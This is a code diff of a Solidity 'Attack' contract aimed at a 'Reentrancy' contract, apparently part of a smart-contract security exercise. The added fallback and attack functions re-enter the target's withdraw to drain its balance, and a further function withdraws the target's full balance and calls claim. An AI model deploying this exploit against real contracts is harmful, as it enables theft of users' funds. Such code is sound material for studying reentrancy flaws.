@@ -85,22 +85,30 @@ contract Reentrancy {
 
 contract Attack {
 
-    Reentrancy private immutable reentrance;
+    Reentrancy private reentrancy;
+    address payable public owner;
 
-    constructor(address payable _reentrance) public {
-        reentrance = Reentrancy(_reentrance);
+    constructor(address payable _reentrancy) public payable{
+        reentrancy = Reentrancy(_reentrancy);
+        owner = msg.sender;
+    }
+
+    function () external payable {
+        
+        reentrancy.withdraw(msg.value);
     }
 
     function attack() public payable {
-        reentrance.deposit{value: msg.value}();
-        reentrance.withdraw(reentrance.balanceOf(address(this)));
+        reentrancy.deposit.value(msg.value)();
+        reentrancy.withdraw(msg.value);
+
     }
 
-    receive() external payable {
-        
-        reentrance.withdraw(reentrance.balanceOf(address(this)));
+    function getBalanceRentrance() public payable {
+        reentrancy.withdraw(address(reentrancy).balance);
+        reentrancy.claim();
     }
-    
+
     function getBalance() public view returns(uint) {
         return address(this).balance;
     }
